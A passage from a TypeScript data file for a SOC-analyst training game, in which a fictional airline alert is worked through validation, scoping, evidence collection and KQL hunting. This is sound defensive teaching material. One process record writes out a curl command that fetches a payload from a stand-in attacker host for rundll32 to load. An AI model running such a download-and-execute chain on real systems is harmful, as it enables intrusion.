import type { RoomExperience } from "./types";

// "Operation Full Shift" for the "investigate-alert-workflow" room.
// Script: docs/campaign/89-investigate-alert-workflow.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Tamarind Air (fictional regional airline), not the graded tasks' Castleton Underwriting records.
// Signature: One Alert, Start to Finish. One alert worked through all seven steps, in order, on a
// Defender-style portal, then the loop back: a KQL hunt that tests the scope the portal could not.
// Game mix: defuse + hunt + portal.
//
// TASK ORDER CHANGED. New order, one group per station:
//   r1, q1, la1, o1 | r2, la2, qf1 | r3, q2 | r4, r5, q4, m1 | ac1, q3, f1
// Original: r1, r2, q1, la1, o1, r3, q2, la2, m1, r4, ac1, q3, r5, q4, qf1, f1.
// Why: each station is now a run of workflow steps. ac1 cites the Step 7 escalation criteria, which
// r5 teaches, so r5 must come first. q2 opens on "a second host", which la2 finds. qf1 is the pivot
// behind la2. m1 needs all seven steps taught. q3 and f1 stay after ac1 because they read its record.
// The five readings stay in their own order, so "Reading 2" and "Reading 4" in graded text still hold.
//
// Lab data differs from the graded tasks: the alert is a script host starting a shell from a mailed
// ZIP, never a macro spawning encoded PowerShell (q1, la1); the anatomy reads cmd.exe under
// wscript.exe (la1); the pivot is on a destination address in DeviceNetworkEvents, and it finds
// hosts that received the same lure, never a logon from a compromised workstation (r2 checkpoint,
// la2, qf1); the logon anatomy is a planned Type 10 RDP session, never Type 3 NTLM (la2); volatility
// is taught from a table of lifetimes, never as a ranked list (q2); ATT&CK is mapped on copies,
// listings, uploads and a library bundle, with no archive utility (q3); the 5 Whys ends at an expired exception, never
// a rollout gap (r4 checkpoint); the hand-off primer shows a good package, never a thin note (q4);
// the escalation rounds are a kiosk, a mailbox rule, a manifest, an approved upload and one exposed
// admin session, never a privileged account staging finance data (ac1); the gap worksheet uses
// other timestamps and neither answer is 89 (f1).

const SCRIPT_HASH = "f49f9a148eff58a45678e6177edf003b0aaf22ccbaf84adfa2f37a75fd3d1210";
const DLL_HASH = "d9cf5e524681173d61bc1c941aa78c3f344bf1199d3ca0c7e9472fdb2ba17a05";

export const INVESTIGATE_ALERT_WORKFLOW: RoomExperience = {
  roomId: "investigate-alert-workflow",
  codename: "Operation Full Shift",
  theme: "fullshift",
  handler: { name: "Soren Adebayo", role: "Senior SOC Analyst, Tamarind Air" },
  briefing: [
    "Tamarind Air. Fourteen turboprops, 620 staff, and a first wave that leaves the gates at 06:30.",
    "At 06:05 one alert lands on your name: one script, on one dispatcher's laptop, in the ops control room.",
    "Soren Adebayo has worked that chair for nine years and keeps one rule: the same seven steps, in the same order, whoever is watching.",
    "Work this alert from the first record to the last line of the hand-off, then make the call yourself.",
  ],
  mission: "Work one alert through all seven steps in the portal, hunt for what the portal never showed, read the records that prove it, collect before evidence fades, rebuild the story on one clock, write the hand-off, then make the call on the graded case.",
  estimate: "~60 min",
  look: { primary: "#d4a373", secondary: "#6ec6b8", warn: "#ef5a4c" },
  scene: "facilityfullshift",
  layout: "facility",
  stations: [
    {
      id: "alert",
      label: "The Alert",
      topic: "Why a workflow · the seven steps · Step 1, Validate · reading a process record",
      tagline: "Same seven steps, every time",
      building: "control",
      taskIds: ["inv7-r1", "inv7-q1", "inv7-la1", "inv7-o1"],
    },
    {
      id: "scope",
      label: "How Far It Goes",
      topic: "Step 2, Scope · pivoting on an artefact · account, host and data scope · reading a logon record",
      tagline: "A first answer is not the answer",
      building: "lab",
      taskIds: ["inv7-r2", "inv7-la2", "inv7-qf1"],
    },
    {
      id: "fade",
      label: "Before It Fades",
      topic: "Step 3, Collect and preserve · volatility · chain of custody · collect before you act",
      tagline: "Some evidence has a clock on it",
      building: "archive",
      taskIds: ["inv7-r3", "inv7-q2"],
    },
    {
      id: "casefile",
      label: "The Case File",
      topic: "Step 4, super-timeline · Step 5, ATT&CK and 5 Whys · Step 6, Document · Step 7, the hand-off",
      tagline: "One clock, one story, five parts",
      building: "office",
      taskIds: ["inv7-r4", "inv7-r5", "inv7-q4", "inv7-m1"],
    },
    {
      id: "call",
      label: "The Call",
      topic: "Weighing a finding against the escalation criteria · mapping it · timing it",
      tagline: "The classification is yours first",
      building: "ticket",
      taskIds: ["inv7-ac1", "inv7-q3", "inv7-f1"],
      boss: true,
    },
  ],
  personas: {
    "inv7-q1": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "Minute one. Tell me what you do, and why that first." },
    "inv7-la1": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "Read the record, not the title on it." },
    "inv7-o1": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "Say the workflow back to me, the way it really runs." },
    "inv7-la2": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "One record. Tell me what it establishes, and no more." },
    "inv7-qf1": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "Write it so the next analyst can run it." },
    "inv7-q2": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "You have what's left of this shift. Where does the time go?" },
    "inv7-q4": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "Read this note as the person who has to pick it up." },
    "inv7-m1": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "How do I tell a finished step from a ticked one?" },
    "inv7-ac1": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "The classification is yours. Make it before you call me." },
    "inv7-q3": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "Name this in words another team will understand." },
    "inv7-f1": { name: "Soren Adebayo", role: "Senior SOC Analyst", line: "The timeline needs one number from you." },
  },
  briefings: {
    // ── Reading 1: why a workflow, and the whole job once, in order ──
    "inv7-r1": [
      {
        kind: "portal",
        title: "One Alert, Start to Finish",
        prompt: "Tuesday, 06:05, the ops control room. Soren has put one alert on your name, and the first wave leaves at 06:30. Work it all the way through, the seven steps in their order. Each job below names the step it belongs to.",
        primer: {
          title: "Seven steps, in the same order, on every alert",
          points: [
            "A workflow is a pre-flight checklist for an alert. Pilots run it on a clear morning as well as a bad one: memory skips things without telling you, and a completed checklist shows what was looked at.",
            "The steps are **1 Validate** (is it real?), **2 Scope** (how far does it go?), **3 Collect and preserve**, **4 Reconstruct the timeline**, **5 Map to ATT&CK and find root cause**, **6 Document**, **7 Report and hand off**.",
            "The order is not a habit. Each step works on what the step before it produced.",
            "**Validate** is a set of checks on the record itself: how common this file is across the fleet, whether the process that started it has a reason to, whether the account fits the work, and whether it matches something already explained.",
            "The first 15 minutes shape the rest. What goes wrong in Step 1 or early in Step 2 compounds, so those are the steps that deserve your care.",
          ],
          example: {
            label: "Worked example: Step 1 on a different alert",
            lines: [
              "Alert: `msiexec.exe` started by `ccmexec.exe` on a check-in kiosk at 02:10.",
              "Seen elsewhere? The same package hash on 38 kiosks, the same night.",
              "Does the parent fit? `ccmexec.exe` is the software deployment client, so yes.",
              "Does the account fit? SYSTEM, which is how deployments run.",
              "Already explained? Change ticket CHG-4471. Step 1 ends here, in writing: benign, deployment, ticket attached.",
            ],
          },
        },
        skin: "defender",
        product: "Security portal",
        resource: "Tamarind Air",
        tenant: "tamarindair.example",
        home: "home",
        menu: [
          { items: [{ id: "home", label: "Home" }] },
          { group: "Investigation & response", items: [{ id: "incidents", label: "Incidents" }, { id: "alerts", label: "Alerts" }] },
          { group: "Assets", items: [{ id: "devices", label: "Devices" }] },
        ],
        pages: {
          home: {
            heading: "Home",
            tiles: [{ label: "Active incidents", value: "2" }, { label: "Pending actions", value: "2" }, { label: "MTTI, last 30 days", value: "2 h 47 min" }],
            note: "MTTI, Mean Time to Investigate, runs from the moment an alert fires until an analyst has a validated picture of what happened. Your work starts in the incident queue.",
          },
          incidents: {
            heading: "Incidents",
            filters: ["Last 7 days"],
            table: {
              columns: ["Incident name", "Incident Id", "Severity", "Priority score", "Active alerts", "Impacted assets", "Service sources", "Status", "Assigned to"],
              rows: [
                { id: "inc-5126", cells: ["Email reported by user as malware or phish", "5126", "Informational", "6", "1", "1 mailbox", "Office 365", "Active", "Automation"], tone: "info" },
                { id: "inc-5127", cells: ["Script host started a shell on one endpoint", "5127", "High", "81", "1", "1 device, 1 user, 1 mailbox", "Endpoint, Office 365", "Active", "Unassigned"], tone: "high", record: "inc5127" },
                { id: "inc-5118", cells: ["Script host started a shell on one endpoint", "5118", "Informational", "9", "0", "1 device", "Endpoint", "Resolved", "Soren Adebayo"], tone: "info", record: "inc5118" },
              ],
            },
          },
          alerts: {
            heading: "Alerts",
            filters: ["Last 7 days"],
            note: "Each alert carries a severity, a detection source and an affected entity. Alerts grouped into a case share an incident ID.",
            table: {
              columns: ["Alert name", "Severity", "Detection source", "Entity", "Incident", "First activity"],
              rows: [
                { id: "al-1", cells: ["Script host started a shell", "High", "Custom detection, Ops devices group", "TA-OPS-LT31", "5127", "Tue 05:36"], tone: "high" },
                { id: "al-2", cells: ["Email reported by user as malware or phish", "Informational", "Office 365", "g.adeyemi mailbox", "5126", "Tue 04:50"], tone: "info" },
              ],
            },
          },
          devices: {
            heading: "Devices",
            filters: ["Device inventory"],
            note: "Risk level comes from the device's active alerts. Exposure level comes from pending security recommendations, such as missing patches.",
            table: {
              columns: ["Device name", "Risk level", "Exposure level", "OS", "Onboarding status", "Last seen"],
              rows: [
                { id: "dev-dc", cells: ["TA-DC01", "Low", "Low", "Windows Server 2022", "Onboarded", "1 min ago"], tone: "low" },
                { id: "dev-lt12", cells: ["TA-CRW-LT12", "Low", "Low", "Windows 11 23H2", "Onboarded", "4 min ago"], tone: "low" },
                { id: "dev-wk08", cells: ["TA-MNT-WK08", "Low", "Medium", "Windows 11 23H2", "Onboarded", "2 min ago"], tone: "low" },
                { id: "dev-lt31", cells: ["TA-OPS-LT31", "High", "Medium", "Windows 11 23H2", "Onboarded", "1 min ago"], tone: "high", record: "lt31" },
                { id: "dev-sv02", cells: ["TA-CRW-SV02", "Low", "Low", "Windows Server 2022", "Onboarded", "1 min ago"], tone: "low" },
              ],
            },
          },
        },
        records: {
          inc5127: {
            id: "5127",
            title: "Script host started a shell on one endpoint",
            strip: [
              { field: "status", label: "Status", value: "Active", tone: "high", options: ["Active", "In progress", "Resolved"] },
              { field: "assigned", label: "Assigned to", value: "Unassigned", options: ["Assign to me", "Soren Adebayo"] },
              { field: "verdict", label: "Classification", value: "Not set", options: ["True positive", "Informational, expected activity", "False positive"] },
            ],
            facts: [["First activity", "Mon 18:04"], ["Alert fired", "Tue 05:37"], ["Categories", "Initial access, Execution, Stealth, Command and control"], ["Service sources", "Endpoint, Office 365"]],
            evidence: [["Alerts", "1"], ["Devices", "1"], ["Users", "1"], ["Mailboxes", "1"]],
            tactics: "Initial Access, Execution, Stealth, Command and Control",
            timeline: [
              { time: "05:37", text: "Custom detection: script host started a shell", tone: "high" },
            ],
            graph: {
              nodes: [
                { id: "mail", label: "Crew_Bid_Nov.zip", type: "mail", x: 12, y: 20, order: 1, facts: [["Sender", "rosters@crewbid-notify.example"], ["Delivered", "Mon 18:04"], ["Source", "Defender for Office 365"]] },
                { id: "user", label: "t.nkosi", type: "user", x: 14, y: 72, order: 2, facts: [["Role", "Flight dispatcher, Ops Control"], ["On shift", "Tue 05:00 to 13:00"], ["Signed in", "Tue 05:02, interactive, at the desk"], ["Local admin", "No"]] },
                { id: "lt31", label: "TA-OPS-LT31", type: "device", x: 44, y: 22, order: 3, alerted: true, facts: [["Risk level", "High"], ["Alerts", "1"], ["Source", "Defender for Endpoint"]] },
                { id: "js", label: "Crew_Bid_Nov.js", type: "file", x: 50, y: 74, order: 4, facts: [["SHA256", SCRIPT_HASH], ["Prevalence in org", "1 device"], ["First seen", "Tue 05:36"], ["Signer", "Unsigned"], ["Path", "C:\\Users\\t.nkosi\\Downloads\\Crew_Bid_Nov\\Crew_Bid_Nov.js"]] },
                { id: "wscript", label: "wscript.exe", type: "file", x: 84, y: 74, order: 5, alerted: true, facts: [["Parent", "explorer.exe"], ["Ran", "Crew_Bid_Nov.js"], ["Started", "cmd.exe, which ran curl.exe"], ["Then", "rundll32.exe loaded wxupd.dat"]] },
                { id: "ip", label: "198.51.100.44", type: "ip", x: 86, y: 20, order: 6, facts: [["First seen", "Tue 05:41"], ["Port", "443"], ["Contacted by", "rundll32.exe"]] },
              ],
              edges: [["mail", "user"], ["user", "lt31"], ["lt31", "js"], ["js", "wscript"], ["wscript", "ip"]],
            },
            logs: {
              query: "",
              columns: ["Alert", "Severity", "Detection source", "Entity"],
              rows: [{ id: "a1", cells: ["Script host started a shell", "High", "Custom detection", "TA-OPS-LT31"] }],
            },
            entities: [
              { id: "lt31", label: "TA-OPS-LT31", type: "Device", seen: "1 alert" },
              { id: "nkosi", label: "t.nkosi", type: "User", seen: "1 alert" },
              { id: "mbx", label: "t.nkosi", type: "Mailbox", seen: "1 email" },
            ],
            actions: [{ id: "comment", label: "Add comment" }],
            banners: { comment: "Comment saved Tue 06:24 by analyst@tamarindair.example. Real: hash on 1 device, script host started a shell, no change ticket. Searched so far: this incident's assets only. Process list and connections 06:19, package 06:21, device isolated 06:22." },
            remediation: [
              { id: "ev1", entity: "wxupd.dat", type: "File", verdict: "Malicious", action: "Quarantine file", detail: "Fetched by curl.exe from a script, loaded by rundll32.exe. Unsigned, on 1 device." },
              { id: "ev2", entity: "CrewSyncAgent.exe", type: "File", verdict: "Suspicious", action: "Quarantine file", detail: "Ran 40 seconds after the script. Signed by Tamarind Air IT, on 212 devices since 2024." },
            ],
          },
          inc5118: {
            id: "5118",
            title: "Script host started a shell on one endpoint",
            facts: [["Classification", "Informational, expected activity"], ["Closed by", "Soren Adebayo, last Wednesday"], ["Process", "wscript.exe drivemap.vbs, from \\\\TA-DC01\\NETLOGON"], ["Parent", "userinit.exe"], ["Seen on", "212 devices, at every logon"], ["Owner", "IT, change CHG-3390"]],
            timeline: [{ time: "Wed 07:12", text: "Closed: IT's drive-mapping logon script, which calls cmd.exe for net use", tone: "info" }],
          },
          lt31: {
            id: "dev-lt31",
            title: "TA-OPS-LT31",
            actions: [
              { id: "scan", label: "Run antivirus scan" },
              { id: "package", label: "Collect investigation package" },
              { id: "isolate", label: "Isolate device" },
              { id: "live", label: "Initiate Live Response session" },
            ],
            banners: {
              package: "Investigation package collected Tue 06:21 by analyst@tamarindair.example. Download it from the Action center.",
              isolate: "TA-OPS-LT31 is isolated: every connection is cut except the one to the Defender service.",
            },
            facts: [["Risk level", "High"], ["Exposure level", "Medium"], ["Logged-on user", "t.nkosi"], ["Onboarding status", "Onboarded"], ["Last seen", "1 min ago"]],
            timeline: [
              { time: "Tue 06:02", text: "rundll32.exe connected to 198.51.100.44:443", tone: "high" },
              { time: "Tue 05:41", text: "rundll32.exe connected to 198.51.100.44:443, first time", tone: "medium" },
              { time: "Tue 05:37", text: "rundll32.exe loaded wxupd.dat from the Temp folder", tone: "high" },
              { time: "Tue 05:37", text: "curl.exe wrote wxupd.dat to the Temp folder", tone: "medium" },
              { time: "Tue 05:36", text: "wscript.exe started cmd.exe", tone: "high" },
              { time: "Tue 05:36", text: "explorer.exe started wscript.exe with Crew_Bid_Nov.js", tone: "medium" },
              { time: "Tue 05:35", text: "t.nkosi opened Crew_Bid_Nov.zip from Outlook", tone: "info" },
              { time: "Tue 05:02", text: "t.nkosi signed in, interactive", tone: "info" },
            ],
            panes: {
              live: [
                ["C:\\>", "processes"],
                ["7312", "rundll32.exe  C:\\Users\\t.nkosi\\AppData\\Local\\Temp\\wxupd.dat,Init  t.nkosi"],
                ["C:\\>", "connections"],
                ["TCP", "10.30.4.31:52214  198.51.100.44:443  ESTABLISHED  7312"],
                ["C:\\>", "getfile C:\\Users\\t.nkosi\\AppData\\Local\\Temp\\wxupd.dat"],
                ["SHA256", DLL_HASH],
              ],
            },
          },
        },
        steps: [
          { id: "queue", ask: "Step 1, Validate. Open your work queue.", hint: "Incidents, under Investigation & response.", target: "menu:incidents", why: "The alert has become an incident, and the incident is the case file. Everything you do from here gets attached to it." },
          { id: "open", ask: "Two rows here share a name. Open the one that is yours this morning.", hint: "Read Status and Assigned to, not just the name.", target: "row:inc-5127", why: "High, active, nobody on it. 5118 has the same name, but it was closed last week. Hold that thought." },
          { id: "take", ask: "Nobody owns this. Take it.", hint: "Assigned to, in Incident details on the right.", target: "set:assigned:Assign to me", why: "One name on a case means the next person knows who to ask." },
          { id: "work", ask: "Show the shift it is being worked.", hint: "Status, in Incident details.", target: "set:status:In progress", why: "MTTI has been running since 05:37. It stops when you have a validated picture, and that is what the next few clicks are for." },
          { id: "play", ask: "Before judging anything, replay what the portal knows.", hint: "Play attack story, above the incident graph.", target: "action:play", why: "The graph builds in the order things happened, and it shows how the pieces connect. Remember it only shows what the portal has correlated." },
          { id: "seen", ask: "First check: has this script been seen anywhere else in the fleet?", hint: "Click the script in the graph and read Prevalence in org.", target: "node:js", why: "One device, first seen this morning, unsigned. Nothing in the fleet vouches for it." },
          { id: "parent", ask: "Second check: what started it, and what did it start?", hint: "The script host in the graph: read Parent and Started.", target: "node:wscript", why: "explorer.exe as the parent means a double-click, so a person opened it. But a roster sheet has no reason to open a shell and fetch a file." },
          { id: "account", ask: "Third check: does the account fit the work?", hint: "The user in the graph.", target: "node:user", why: "On shift, at the desk, no admin rights. The account fits and the behaviour doesn't, which says a person's session was used, not that the person misbehaved." },
          { id: "known", ask: "Last check: is this already explained? Incident 5118 has this exact name and was closed as expected. Open it and compare.", hint: "Back to Incidents, the row with Status Resolved.", target: "row:inc-5118", why: "5118 is IT's logon script from NETLOGON, on 212 devices, with a change ticket and an owner. Yours came out of a Downloads folder on one laptop. Same title, nothing else alike. Step 1 is done: real, and understood." },
          { id: "assets", ask: "Step 2, Scope. Back in your incident: what does the portal say this touches?", hint: "Open 5127 again, then the Assets tab.", target: "tab:assets", why: "One device, one user, one mailbox. That is what the alert touched. Note that it is all you have searched so far." },
          { id: "device", ask: "Step 3, Collect and preserve. Evidence is fading fastest on the laptop. Open it.", hint: "Devices, under Assets.", target: "row:dev-lt31", why: "TA-OPS-LT31 is high risk and still calling out. Before anything changes its state, take what it holds." },
          { id: "live", ask: "Capture what only exists right now.", hint: "The remote shell, in the row of actions above the tabs.", target: "action:live", why: "Running processes and open connections vanish when a process exits or the laptop reboots, so they go first. PID 7312 and its session to 198.51.100.44 are now on record, with the file's hash." },
          { id: "package", ask: "Now take the rest of the host's state, as one stamped bundle.", hint: "The action that collects a package.", target: "action:package", why: "Autoruns, services, scheduled tasks and event logs in one file, with the time and your name on it. Add its hash to your notes when you download it." },
          { id: "isolate", ask: "The evidence is safe. Stop the laptop talking to that address.", hint: "One of the actions above the tabs.", target: "action:isolate", why: "Containment changes state, which is why it waited. Isolation keeps the link to the Defender service, so you can still reach the device." },
          { id: "approve", ask: "The automated investigation left two actions waiting in your incident. Approve the one the evidence supports.", hint: "Incidents, 5127, the Evidence and Response tab.", target: "action:approve:ev1", why: "Fetched by a script, loaded by rundll32.exe, unsigned, on one device. The evidence holds up the verdict." },
          { id: "reject", ask: "Now the other one. Should that file go?", hint: "Suspicious is a request to look. Read the Evidence column.", target: "action:reject:ev2", why: "Close in time is not a link. A signed agent that runs across 212 devices will always sit next to something." },
          { id: "start", ask: "Step 4, Timeline. The alert fired at 05:37. Where does this story really begin?", hint: "Attack story tab: the first node that appears when you play it.", target: "node:mail", why: "Monday 18:04, nearly twelve hours earlier. The alert time is when somebody noticed. A timeline starts where the evidence starts." },
          { id: "map", ask: "Step 5, Map to ATT&CK. Read how the portal classifies what you have seen.", hint: "The Summary tab.", target: "tab:summary", why: "A shared word for each stage: Initial Access for the mail, Execution for the script (T1059.007), Stealth for rundll32 (T1218.011), Command and Control for the beacon. Why this was possible at all is the other half of Step 5, and it comes later." },
          { id: "note", ask: "Step 6, Document. Write down what you have established, with times and values.", hint: "Add comment, above the tabs.", target: "action:comment", why: "Step 6 is a habit that runs beside every other step, and a note made now beats a memory later. Look at what it says you searched." },
          { id: "classify", ask: "Step 7, Report and hand off. Classify the incident.", hint: "Classification, in Incident details.", target: "set:verdict:True positive", why: "The evidence supports it: real activity, with no owner and no ticket behind it." },
          { id: "handoff", ask: "Hand it to Soren for review. Keep the status as it is.", hint: "Assigned to, in Incident details.", target: "set:assigned:Soren Adebayo", why: "Soren reads your note and hands it straight back: 'One device is what the alert touched. You haven't tested that yet. Go again.' That is what the next lab is for." },
        ],
        traps: {
          "action:isolate": "Not yet. Isolating changes the state of the host, and the evidence on it comes first.",
          "action:scan": "A scan won't show what is running now, and it can remove files you may still need to collect.",
          "set:status:Resolved": "Resolved tells the whole shift this is over. So far all anyone has searched is what one alert touched.",
          "set:verdict:False positive": "This record is correct and it describes real activity. A false positive means the detection fired on something that did not happen.",
          "set:verdict:Informational, expected activity": "Expected activity has an owner, a ticket or a schedule behind it, like 5118 does. This has none of those.",
          "action:approve:ev2": "That quarantines IT's crew sync agent on a dispatch laptop. Signed, on 212 devices since 2024: running near the script doesn't link it to the script.",
          "action:reject:ev1": "That leaves a file fetched by a script and loaded by rundll32.exe on the laptop. Rejecting is for when the evidence doesn't hold up, and here it does.",
        },
        lesson: "Validate with checks you can name: how rare, who started it, whether the account fits, whether it is already explained. Collect before you act, the most fragile evidence first. Start the timeline where the evidence starts, not where the alert fired. Write down what you searched as well as what you found, because that is the only honest size of your scope.",
      },
    ],
    // ── Log analysis 1: reading a process record ──
    "inv7-la1": [
      {
        kind: "anatomy",
        title: "Read a Process Record in Two Halves",
        prompt: "This is one row from the chain you just worked on TA-OPS-LT31, as Advanced Hunting stores it. Read it field by field before the graded record: which half is the process that ran, which half launched it, and what the switches and the file type tell you.",
        primer: {
          title: "A process record is one parent and one child",
          points: [
            "A program that only opens or displays files has no ordinary reason to start a command shell. When one does, code inside the file is usually what asked for it.",
            "Some file types can carry code: `.js`, `.vbs`, `.hta`, and macro-enabled Office files such as `.xlsm`.",
            "Command-line switches are evidence too. On `powershell.exe`, `-w hidden` runs with no window, `-enc` takes a base64-encoded command, and `-nop` skips the user's profile.",
          ],
          example: {
            label: "Worked example: two pairs, one question",
            lines: [
              "`notepad.exe` started by `explorer.exe`: someone double-clicked a text file. It fits.",
              "`cmd.exe` started by `w3wp.exe`: a web server opened a shell. A web server has no ordinary reason to, so look closer.",
            ],
          },
        },
        source: "Advanced Hunting · DeviceProcessEvents · ta-ops-lt31",
        fields: [
          { key: "Timestamp", value: "2026-11-03T05:36:19Z", label: "When" },
          { key: "DeviceName", value: "ta-ops-lt31", label: "Where" },
          { key: "ActionType", value: "ProcessCreated", note: "A new process started. Fields with no prefix describe that new process." },
          { key: "FileName", value: "cmd.exe", label: "What ran" },
          { key: "FolderPath", value: "C:\\Windows\\System32\\cmd.exe", note: "The full path, with the file name at the end." },
          { key: "ProcessCommandLine", value: "cmd.exe /c curl -s -o %TEMP%\\wxupd.dat https://dl.crewbid-notify.example/wxupd.dat", label: "How it ran" },
          { key: "ProcessId", value: "7104" },
          { key: "AccountDomain", value: "TAMARIND" },
          { key: "AccountName", value: "t.nkosi", label: "As whom", note: "Whose session this ran in." },
          { key: "InitiatingProcessFileName", value: "wscript.exe", label: "Launched it", note: "Every field starting InitiatingProcess describes the parent." },
          { key: "InitiatingProcessCommandLine", value: "\"wscript.exe\" \"C:\\Users\\t.nkosi\\Downloads\\Crew_Bid_Nov\\Crew_Bid_Nov.js\"", note: "The parent's own command line often names the file that started the chain." },
          { key: "InitiatingProcessId", value: "6988", label: "Parent PID" },
          { key: "ReportId", value: "30217", note: "Defender's counter for this record. With the device and Timestamp, it finds this exact row again." },
        ],
        summary: "Two halves: the plain fields are the process that ran, and the InitiatingProcess fields are the one that launched it. Then one question: does this parent have an ordinary reason to start this child? wscript.exe exists to run scripts, and a script that opens a shell to fetch a file is that file's code at work. Once the record is read and understood, Step 1 hands over to Step 2.",
      },
    ],
    // ── Reading 2: scope ──
    "inv7-r2": [
      {
        kind: "hunt",
        title: "Who Else Shares This Address?",
        prompt: "Soren sent the incident back: 'One device is what the alert touched. Test it.' The script's hash shows one device, but each recipient's copy could differ by a line. The address it calls, 198.51.100.44, is harder to change. Build the pivot one line at a time, and every result you see is what that line really returns.",
        primer: {
          title: "Scope asks how far, so pivot on the thing, not the person",
          points: [
            "Scope asks three questions: which accounts touched the host, which other systems those accounts touched, and what data lives there. Keep **account**, **host** and **data** scope apart in your notes.",
            "A search by someone's name can only return that person's rows, so it can never show a problem bigger than them. To find what nobody has flagged, take a property of the activity itself, such as a destination address or a file hash, and ask who else shares it. That is an **artefact pivot**.",
            "Scope is a loop. New evidence sends you back round until the evidence stops growing it.",
            "Identity turns up in roughly nine of ten investigations that go past the first alert, so every host you add brings a new question: who signed in there?",
            "KQL: `where` keeps rows, `==` must match exactly, `=~` ignores case, `!in~` drops a list. `summarize count() by X` gives one row per X, and `join` brings in another table on a shared column.",
          ],
          example: {
            label: "Worked example: pivoting on a hash",
            lines: [
              "Asking about a person: `DeviceFileEvents | where InitiatingProcessAccountName =~ \"b.lowe\"` returns only what b.lowe did.",
              "Asking about the file: `DeviceFileEvents | where SHA256 == \"<the installer's hash>\" | summarize count() by DeviceName`",
              "The second query returned 9 devices, and 6 of them were in no ticket.",
            ],
          },
        },
        language: "KQL",
        start: "DeviceNetworkEvents",
        goal: "one row for each account signed in on every device that shares the address",
        tables: [
          {
            name: "DeviceNetworkEvents",
            note: "Network connections seen by the sensor.",
            columns: ["Timestamp", "DeviceName", "ActionType", "RemoteIP", "RemotePort", "InitiatingProcessFileName", "InitiatingProcessAccountName"],
            rows: [
              ["11-03 05:41", "ta-ops-lt31", "ConnectionSuccess", "198.51.100.44", "443", "rundll32.exe", "t.nkosi"],
              ["11-03 05:43", "ta-ops-lt31", "ConnectionSuccess", "203.0.113.18", "443", "msedge.exe", "t.nkosi"],
              ["11-03 05:47", "ta-mnt-wk08", "ConnectionSuccess", "198.51.100.44", "443", "rundll32.exe", "r.sandhu"],
              ["11-03 05:52", "ta-crw-lt12", "ConnectionFailed", "198.51.100.44", "443", "rundll32.exe", "a.brandt"],
              ["11-03 05:55", "ta-crw-sv02", "ConnectionSuccess", "203.0.113.18", "443", "svchost.exe", "SYSTEM"],
              ["11-03 06:02", "ta-ops-lt31", "ConnectionSuccess", "198.51.100.44", "443", "rundll32.exe", "t.nkosi"],
              ["11-03 06:05", "ta-soc-sbx01", "ConnectionSuccess", "198.51.100.44", "443", "python.exe", "svc-enrich"],
            ],
          },
          {
            name: "DeviceLogonEvents",
            note: "Sign-ins on a device.",
            columns: ["Timestamp", "DeviceName", "ActionType", "AccountName", "LogonType", "RemoteDeviceName"],
            rows: [
              ["11-03 05:02", "ta-ops-lt31", "LogonSuccess", "t.nkosi", "Interactive", "-"],
              ["11-03 05:11", "ta-mnt-wk08", "LogonSuccess", "r.sandhu", "Interactive", "-"],
              ["11-03 05:14", "ta-fin-lt05", "LogonSuccess", "l.marsh", "Interactive", "-"],
              ["11-03 05:29", "ta-crw-lt12", "LogonSuccess", "a.brandt", "Interactive", "-"],
              ["11-03 05:40", "ta-it-jump1", "LogonSuccess", "adm-c.ibarra", "Interactive", "-"],
              ["11-03 05:56", "ta-mnt-wk08", "LogonSuccess", "adm-c.ibarra", "RemoteInteractive", "ta-it-jump1"],
              ["11-03 05:58", "ta-crw-lt12", "LogonFailed", "m.dlamini", "Interactive", "-"],
            ],
          },
          {
            name: "DeviceFileEvents",
            note: "Files created, changed, deleted.",
            columns: ["Timestamp", "DeviceName", "FileName", "FolderPath", "ActionType", "InitiatingProcessFileName"],
            rows: [
              ["11-03 05:37", "ta-ops-lt31", "wxupd.dat", "C:\\Users\\t.nkosi\\AppData\\Local\\Temp\\wxupd.dat", "FileCreated", "curl.exe"],
              ["11-03 05:39", "ta-mnt-wk08", "wxupd.dat", "C:\\Users\\r.sandhu\\AppData\\Local\\Temp\\wxupd.dat", "FileCreated", "curl.exe"],
              ["11-03 05:50", "ta-crw-lt12", "wxupd.dat", "C:\\Users\\a.brandt\\AppData\\Local\\Temp\\wxupd.dat", "FileCreated", "curl.exe"],
            ],
          },
        ],
        rungs: [
          {
            id: "pivot", ask: "Line 2: the ticket names t.nkosi. Choose the filter that can show something bigger than t.nkosi.",
            choices: [
              { id: "a", text: '| where InitiatingProcessAccountName =~ "t.nkosi"', why: "Three rows, all t.nkosi's. A search by name can only ever answer for that name.", apply: { op: "where", col: "InitiatingProcessAccountName", test: "ieq", value: "t.nkosi" } },
              { id: "c", text: '| where RemoteIP == "198.51.100.44"', right: true, why: "Now the question is about the address, not the person. Five rows, and other names have appeared.", apply: { op: "where", col: "RemoteIP", test: "eq", value: "198.51.100.44" } },
              { id: "b", text: '| where DeviceName =~ "ta-ops-lt31"', why: "The host you already know, so the same three rows. It adds nothing to what the alert told you.", apply: { op: "where", col: "DeviceName", test: "ieq", value: "ta-ops-lt31" } },
            ],
          },
          {
            id: "own", ask: "Line 3: the 06:05 row is Soren's enrichment script, checking the address from the SOC sandbox. Remove your own tooling and nothing else.",
            choices: [
              { id: "a", text: '| where ActionType == "ConnectionSuccess"', why: "That dropped ta-crw-lt12 and kept the sandbox. A failed connection is still a beacon: the malware ran there, and only the firewall stopped it.", apply: { op: "where", col: "ActionType", test: "eq", value: "ConnectionSuccess" } },
              { id: "b", text: '| where DeviceName !in~ ("ta-soc-sbx01", "ta-ops-lt31")', why: "You know about ta-ops-lt31, but it stays in. The next question is who signed in on every host in scope, and that includes the first.", apply: { op: "where", col: "DeviceName", test: "notin", value: ["ta-soc-sbx01", "ta-ops-lt31"] } },
              { id: "c", text: '| where DeviceName !in~ ("ta-soc-sbx01")', right: true, why: "Your own investigation shows up in your own pivots. Four rows left, on three devices.", apply: { op: "where", col: "DeviceName", test: "notin", value: ["ta-soc-sbx01"] } },
            ],
          },
          {
            id: "hosts", ask: "Line 4: turn this into your host scope, one row per device.",
            choices: [
